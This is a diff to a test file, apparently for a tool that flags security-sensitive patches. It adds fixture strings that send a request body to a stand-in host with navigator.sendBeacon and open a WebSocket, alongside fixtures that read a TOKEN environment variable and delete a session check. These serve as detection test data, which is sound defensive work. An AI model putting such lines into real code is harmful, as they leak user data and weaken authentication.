@@ -256,6 +256,8 @@ test('renamed paths, large patches and hidden credential operations remain sensi
     { filename: 'app/composables/useThing.ts', patch: '+const t = process.env.TOKEN' },
     { filename: 'app/stores/useProgressStore.ts' },
     { filename: 'app/utils/guard.ts', patch: '-if (!session) throw new Error()' },
+    { patch: "+navigator.sendBeacon('https://example.invalid', body)" },
+    { patch: '+new WebSocket(url)' },
     { filename: 'app/server/api/thing.get.ts' },
     { filename: 'app/plugins/thing.client.ts' },
   ]) {
